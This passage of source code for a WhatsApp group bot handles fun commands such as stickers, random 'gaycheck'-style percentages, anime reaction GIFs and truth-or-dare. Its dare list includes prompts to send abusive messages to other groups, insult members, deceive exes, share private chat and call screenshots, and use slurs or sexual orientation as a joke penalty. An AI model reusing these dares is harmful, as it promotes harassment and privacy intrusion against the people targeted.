                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
	}
                break 



      //-----------------------------------------------------------------------------------------------------------------------------------//


      case 'couplepp':
      case 'cpp':
      case 'ppcouple': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);

        Taira.sendMessage(from, { react: { text: "🙀", key: m.key } });
        reply(mess.waiting);

        let anu = await fetchJson('https://www.exenoz.tech/couple');

        for (let i = 0; i < 3; i++) {  // the set of picures.
          let random = anu[Math.floor(Math.random() * anu.length)];

          // Sending the male picture
          await Taira.sendMessage(m.chat, { image: { url: random.male }, caption: `For him...` }, { quoted: m });

          // Sending the female picture
          await Taira.sendMessage(m.chat, { image: { url: random.female }, caption: `For her...` }, { quoted: m });
        }
      }
        break;


      //
      case 'coffee': case 'kopi': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let buttonMessage = {
          image: { url: 'https://coffee.alexflipnote.dev/random' },
          caption: `Here is your Coffee...`,
        }
        Taira.sendMessage(m.chat, buttonMessage, { quoted: m })
      }
        break;

		    

      case 'pinterest':
      case 'pin': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🐦", key: m.key } });

        const searchTerm = args.join(" ");
        if (!searchTerm) return reply(`${pushname} Please provide a search term!`);
        reply(mess.waiting);

        const url = `https://www.exenoz.tech/api/pinterest?q=${encodeURIComponent(searchTerm)}`;

        try {
          const response = await axios.get(url);
          const pins = response.data;

          const numImages = 5;
          const randomPins = pins.sort(() => 0.5 - Math.random()).slice(0, numImages);

          randomPins.forEach(pin => {
            Taira.sendMessage(m.chat, { image: { url: pin.url } }, { quoted: m });
          });
        } catch (error) {
          console.error('Error fetching data from Pinterest API:', error);
          reply('Error fetching data from Pinterest API. Please try again later.');
        }
      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//



      //
      case 'swm': case 'take': case 'stickerwm': case 'steal': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        if (!args.join(" ")) return reply(`use -take 🐦Makino-md-v2|By: Tᴀɪʀᴀ Mᴀᴋɪɴᴏ`)
        const swn = args.join(" ")
        const pcknm = swn.split("|")[0];
        const atnm = swn.split("|")[1];
        if (m.quoted.isAnimated === true) {
          Taira.downloadAndSaveMediaMessage(quoted, "gifee")
          Taira.sendMessage(from, { sticker: fs.readFileSync("gifee.webp") }, { quoted: m })
        } else if (/image/.test(mime)) {
          let media = await quoted.download()
          let encmedia = await Taira.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
          await fs.unlinkSync(encmedia)
        } else if (/video/.test(mime)) {
          if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds is allowed!')
          let media = await quoted.download()
          let encmedia = await Taira.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
          await fs.unlinkSync(encmedia)
        } else {
          reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 seconds is allowed!`)
        }
      }
        break;


      case 'smeme': case 'stickermeme': case 'stickmeme': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })

        let { TelegraPh } = require('./lib/uploader')
        if (!text) return reply(`Send/reply Photo With Caption ${prefix + command} *text*`)
        if (text.includes('|')) return reply(`Send/reply Photo With Caption ${prefix + command} *text*`)
        if (!/image/.test(mime)) return reply(`Send/reply Photo With Caption ${prefix + command} *text*`)
        reply(mess.wait)
        mee = await Taira.downloadAndSaveMediaMessage(quoted)
        mem = await TelegraPh(mee)
        meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
        memek = await Taira.sendImageAsSticker(m.chat, meme, m, { packname: '♱MAKINO-MD-V2♱♡⃤', author: global.author })
        await fs.unlinkSync(memek)
      }
        break;

            
case 's': case 'sticker': {
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Taira.sendImageAsSticker(m.chat, media, m, { packname: '♱MAKINO-MD-V2♱♡⃤', author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Taira.sendVideoAsSticker(m.chat, media, m, { packname: '♱MAKINO-MD-V2♱♡⃤', author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break



      //-----------------------------------------------------------------------------------------------------------------------------------//


      case 'soulmate': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(`${mess.grouponly}`);
        Taira.sendMessage(from, { react: { text: "🌝", key: m.key } });

        let member = participants.map(u => u.id);
        let me = m.sender;
        let jodoh = member[Math.floor(Math.random() * member.length)];

        let message = `👫 Be me Soulmate...\n@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`;
        Taira.sendMessage(m.chat, { text: message, mentions: [me, jodoh] }, { quoted: m });
      }
        break;


      case 'handsomecheck':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "😺", key: m.key } })
        if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Kai`)
        const gan = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
        const teng = gan[Math.floor(Math.random() * gan.length)]
        Taira.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
        break;


      case 'beautifulcheck':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "😺", key: m.key } })

        if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Kai`)
        const can = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
        const tik = can[Math.floor(Math.random() * can.length)]
        Taira.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
        break;



      case 'awesomecheck':
      case 'greatcheck':
      case 'gaycheck':
      case 'cutecheck':
      case 'lesbiancheck':
      case 'hornycheck':
      case 'prettycheck':
      case 'lovelycheck':
      case 'uglycheck':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "😺", key: m.key } })

        if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Kai`)
        const sangeh = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
        const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
        Taira.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
        break;


      case 'charactercheck':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🤧", key: m.key } })

        if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Kai`)
        const Tairatttt = ['Compassionate', 'Generous', 'Grumpy', 'Forgiving', 'Obedient', 'Good', 'Simp', 'Kind-Hearted', 'patient', 'UwU', 'top, anyway', 'Helpful']
        const taky = Tairatttt[Math.floor(Math.random() * Tairatttt.length)]
        Taira.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
        break;


      //
      case 'dare':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🌝", key: m.key } })

        const dare = [
          "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
          "spill people who make you pause",
          "call crush/pickle now and send ss",
          "drop only emote every time you type on gc/pc for 1 day.",
          "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
          "call ex saying miss",
          "sing the chorus of the last song you played",
          "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss🥺👉🏼👈🏼",
          "Bang on the table (which is at home) until you get scolded for being noisy",
          "Tell random people - I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
          "mention ex's name",
          "make 1 rhyme for the members!",
          "send ur whatsapp chat list",
          "chat random people with gheto language then ss here",
          "tell your own version of embarrassing things",
          "tag the person you hate",
          "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
          "change name to *I AM DONKEY* for 24 hours",
          "shout *ma chuda ma chuda ma chuda* in front of your house",
          "snap/post boyfriend photo/crush",
          "tell me your boyfriend type!",
          "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
          "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
          "prank chat ex and say *i love u, please come back.* without saying dare!",
          "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
          "change the name to *I am a child of randi* for 5 hours",
          "type in bengali 24 hours",
          "Use selmon bhoi photo for 3 days",
          "drop a song quote then tag a suitable member for that quote",
          "send voice note saying can i call u baby?",
          "ss recent call whatsapp",
          "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
          "pop to a group member, and say fuck you",
          "Act like a chicken in front of ur parents",
          "Pick up a random book and read one page out loud in vn n send it here",
          "Open your front door and howl like a wolf for 10 seconds",
          "Take an embarrassing selfie and paste it on your profile picture",
          "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
          "Walk on your elbows and knees for as long as you can",
          "sing national anthem in voice note",
          "break;dance for 30 seconds in the sitting room😂",
          "Tell the saddest story you know",
          "make a twerk dance video and put it on status for 5mins",
          "Eat a raw piece of garlic",
          "Show the last five people you texted and what the messages said",
          "put your full name on status for 5hrs",
          "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
          "call ur bestie, bitch",
          "put your photo without filter on ur status for 10mins",
          "say i love oli london in voice note🤣🤣",
          "Send a message to your ex and say I still like you",
          "call Crush/girlfriend/bestie now and screenshot here",
          "pop to one of the group member personal chat and Say you ugly bustard",
          "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
          "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
          "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
          "use any bollywood actor photo as ur pfp for 3 days",
          "put your crush photo on status with caption, this is my crush",
          "change name to I AM GAY for 5 hours",
          "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
          "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
          "slap ur butt hardly send the sound of slap through voice note😂",
          "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
          "shout bravooooooooo and send here through voice note",
          "snap your face then send it here",
          "Send your photo with a caption, i am lesbian",
          "shout using harsh words and send it here through vn",
          "shout you bastard in front of your mom/papa",
          "change the name to i am idiot for 24 hours",
          "slap urself firmly and send the sound of slap through voice note😂",
          "say i love the bot owner Kai through voice note",
          "send your gf/bf pic here",
          "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
          "break;up with your best friend for 5hrs without telling him/her that its a dare",
          "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
          "say i love depak kalal through voice note",
          "write i am feeling horny and put it on status, u can delete it only after 5hrs",
          "write i am lesbian and put it on status, u can delete only after 5hrs",
          "kiss your mommy or papa and say i love you😌",
          "put your father name on status for 5hrs",
          "send abusive words in any grup, excepting this grup, and send screenshot proof here"
        ]
        const Tairadareww = dare[Math.floor(Math.random() * dare.length)]
        buffer = await getBuffer(`https://images4.alphacoders.com/101/1016619.jpg`)
        Taira.sendMessage(from, { image: buffer, caption: '*You have chosen Dare...*\n\n' + Tairadareww }, { quoted: m })
        break;




      case 'truth':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🌝", key: m.key } })

        const truth = [
          "Have you ever liked anyone? How long?",
          "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
          "apa ketakutan terbesar kamu?",
          "Have you ever liked someone and felt that person likes you too?",
          "What is the name of your friend's ex-girlfriend that you used to secretly like?",
          "Have you ever stolen money from your father or mom? The reason?",
          "What makes you happy when you're sad?",
          "Ever had a one sided love? if so who? how does it feel bro?",
          "been someone's mistress?",
          "the most feared thing",
          "Who is the most influential person in your life?",
          "what proud thing did you get this year",
          "Who is the person who can make you awesome",
          "Who is the person who has ever made you very happy?",
          "Who is closest to your ideal type of partner here",
          "Who do you like to play with??",
          "Have you ever rejected people? the reason why?",
          "Mention an incident that made you hurt that you still remember",
          "What achievements have you got this year??",
          "What's your worst habit at school??",
          "What song do you sing most in the shower",
          "Have you ever had a near-death experience",
          "When was the last time you were really angry. Why?",
          "Who is the last person who called you",
          "Do you have any hidden talents, What are they",
          "What word do you hate the most?",
          "What is the last YouTube video you watched?",
          "What is the last thing you Googled",
          "Who in this group would you want to swap lives with for a week",
          "What is the scariest thing thats ever happened to you",
          "Have you ever farted and blamed it on someone else",
          "When is the last time you made someone else cry",
          "Have you ever ghosted a friend",
          "Have you ever seen a dead body",
          "Which of your family members annoys you the most and why",
          "If you had to delete one app from your phone, which one would it be",
          "What app do you waste the most time on",
          "Have you ever faked sick to get home from school",
          "What is the most embarrassing item in your room",
          "What five items would you bring if you got stuck on a desert island",
          "Have you ever laughed so hard you peed your pants",
          "Do you smell your own farts",
          "have u ever peed on the bed while sleeping ðŸ¤£ðŸ¤£",
          "What is the biggest mistake you have ever made",
          "Have you ever cheated in an exam",
          "What is the worst thing you have ever done",
          "When was the last time you cried",
          "whom do you love the most among ur parents",
          "do u sometimes put ur finger in ur nosetrilðŸ¤£",
          "who was ur crush during the school days",
          "tell honestly, do u like any boy in this grup",
          "have you ever liked anyone? how long?",
          "do you have gf/bf','what is your biggest fear?",
          "have you ever liked someone and felt that person likes you too?",
          "What is the name of your ex boyfriend of your friend that you once liked quietly?",
          "ever did you steal your mothers money or your fathers money",
          "what makes you happy when you are sad",
          "do you like someone who is in this grup? if you then who?",
          "have you ever been cheated on by people?",
          "who is the most important person in your life",
          "what proud things did you get this year",
          "who is the person who can make you happy when u r sad",
          "who is the person who ever made you feel uncomfortable",
          "have you ever lied to your parents",
          "do you still like ur ex",
          "who do you like to play together with?",
          "have you ever stolen big thing in ur life? the reason why?",
          "Mention the incident that makes you hurt that you still remember",
          "what achievements have you got this year?",
          "what was your worst habit at school?",
          "do you love the bot creator Kai?",
          "have you ever thought of taking revenge from ur teacher?",
          "do you like current prime minister of ur country",
          "you non veg or veg",
          "if you could be invisible, what is the first thing you would do",
          "what is a secret you kept from your parents",
          "Who is your secret crush",
          "whois the last person you creeped on social media",
          "If a genie granted you three wishes, what would you ask for",
          "What is your biggest regret",
          "What animal do you think you most look like",
          "How many selfies do you take a day",
          "What was your favorite childhood show",
          "if you could be a fictional character for a day, who would you choose",
          "whom do you text the most",
          "What is the biggest lie you ever told your parents",
          "Who is your celebrity crush",
          "Whats the strangest dream you have ever had",
          "do you play pubg, if you then send ur id number"
        ]
        const Tairatruthww = truth[Math.floor(Math.random() * truth.length)]
        buffer = await getBuffer(`https://images2.alphacoders.com/650/650812.jpg`)
        Taira.sendMessage(from, { image: buffer, caption: '*You have chosen Truth...*\n' + Tairatruthww }, { quoted: m })
        break;




      //-----------------------------------------------------------------------------------------------------------------------------------//


      //
      case 'smug2':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        reply(mess.waiting)
        waifudd = await axios.get(`https://nekos.life/api/v2/img/smug`)
        /*       var wbuttsss = [
{buttonId: `${prefix}smug2`, buttonText: {displayText: `>>`}, type: 1},
] */
        let button1ssMessages = {
          image: { url: waifudd.data.url },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          /*  footer: `${global.BotName}`,
            buttons: wbuttsss,
            headerType: 4 */
        }
        await Taira.sendMessage(m.chat, button1ssMessages, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      case 'foxgirl':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "✨", key: m.key } })

        reply(mess.waiting)
        waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)

        /* var wbuttsss = [
   {buttonId: `${prefix}foxgirl`, buttonText: {displayText: `>>`}, type: 1},
   ] */
        let button12ssMessages = {
          image: { url: waifudd.data.url },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          /* footer: `${global.BotName}`,
          buttons: wbuttsss,
          headerType: 4 */
        }
        await Taira.sendMessage(m.chat, button12ssMessages, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      case 'animenom':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        waifudd = await axios.get(`https://waifu.pics/api/sfw/nom`)
        /*  let xxhnekobot = [
          {buttonId: `${prefix}animenom`, buttonText: {displayText: `>>`}, type: 1},
          ]  */
        let xx1button3Messages = {
          image: { url: waifudd.data.url },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          /*  buttons: xxhnekobot,
          headerType: 1 */
        }
        await Taira.sendMessage(m.chat, xx1button3Messages, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      case 'waifu3':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
        /*        var wbuttsss = [
{buttonId: `${prefix}waifu3`, buttonText: {displayText: `>>`}, type: 1},
] */
        let button112ssMessages = {
          image: { url: waifudd.data.url },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          /*   footer: `${global.BotName}`,
             buttons: wbuttsss,
             headerType: 4 */
        }
        await Taira.sendMessage(m.chat, button112ssMessages, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      //
      case 'crossplay': case 'crosplay': case 'cosplay':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "✨", key: m.key } })

        /*   const buttons = [
   {buttonId: '-crossplay', buttonText: {displayText: '>>'}, type: 1},
       ]     */

        const cosplybutton = {
          image: { url: 'https://fantox-cosplay-api.onrender.com/' },
          caption: "Guess who am i...",
          /* footer: `${global.BotName}`,
           buttons: buttons,
           headerType: 4 */
        }

        await Taira.sendMessage(m.chat, cosplybutton, { quoted: m }).catch(err => {
          return ('Error!')
        })

        break;


      case 'neko2':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)

        waifud = await axios.get('https://waifu.pics/api/sfw/neko')
        var wbutsss = [
          { buttonId: `${prefix}neko2`, buttonText: { displayText: `>>` }, type: 1 },
        ]
        let buttonssMessage = {
          image: { url: waifud.data.url },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          footer: `${global.BotName}`,
          buttons: wbutsss,
          headerType: 4
        }
        await Taira.sendMessage(m.chat, buttonssMessage, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      case 'feed':
      case 'meow':
      case 'tickle':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
        var wbuttsss = [
          { buttonId: `${prefix + command}`, buttonText: { displayText: `>>` }, type: 1 },
        ]
        let buttonssMessages = {
          image: { url: waifudd.data.url },
          caption: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
          footer: `${global.BotName}`,
          buttons: wbuttsss,
          headerType: 4
        }
        await Taira.sendMessage(m.chat, buttonssMessages, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//



      //
      case 'cry': case 'handhold': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "❤", key: m.key } })

        var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
            musers = `@${m.sender.split("@")[0]} ${command}ed with themself!`
            console.log(musers)

          } else {
            const rcpp = `@${users.split("@"[0])}`
            musers = `@${m.sender.split("@")[0]} ${command}ed with @${users.split("@")[0]} `

            console.log(musers)
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;


      case 'nom': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
            musers = `@${m.sender.split("@")[0]} is eating with themself!`
            console.log(musers)

          } else {
            const rcpp = `@${users.split("@"[0])}`
            musers = `@${m.sender.split("@")[0]} is eating with @${users.split("@")[0]} `

            console.log(musers)
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;


      case 'hug': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
            musers = `@${m.sender.split("@")[0]} hugged themself!`
            console.log(musers)

          } else {
            const rcpp = `@${users.split("@"[0])}`
            musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

            console.log(musers)
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;


      case 'dance': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
            musers = `@${m.sender.split("@")[0]} is dancing alone!!`
            console.log(musers)

          } else {
            const rcpp = `@${users.split("@"[0])}`
            musers = `@${m.sender.split("@")[0]} is dancing with @${users.split("@")[0]} `

            console.log(musers)
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;


      //
      case 'kill': case 'pat': case 'lick': case 'kiss': case 'bite':
      case 'bully': case 'bonk': case 'poke': case 'slap':
      case 'happy':
      case 'cuddle': case 'kick': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
            musers = `@${m.sender.split("@")[0]} ${command}ed themselves!!`
            console.log(musers)

          } else {
            const rcpp = `@${users.split("@"[0])}`
            musers = `@${m.sender.split("@")[0]} ${command}ed  @${users.split("@")[0]} `

            console.log(musers)
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;


      case 'yeet':
      case 'wink': case 'smile':
      case 'wave': case 'blush': case 'smug': case 'glomp':
      case 'cringe': case 'highfive': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
            musers = `@${m.sender.split("@")[0]} ${command}ed at themself!`
            console.log(musers)

          } else {
            const rcpp = `@${users.split("@"[0])}`
            musers = `@${m.sender.split("@")[0]} ${command}ed at @${users.split("@")[0]} `

            console.log(musers)
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;



      case 'megumin':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        reply(mess.waiting)
        ud = await axios.get('https://waifu.pics/api/sfw/megumin')
        let buttonzMessage = {
          image: { url: ud.data.url },
          caption: `Here it is...`,
        }
        await Taira.sendMessage(m.chat, buttonzMessage, { quoted: m }).catch(err => {
          return ('Error!')
        })
        break;


      case 'awoo':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "✨", key: m.key } })
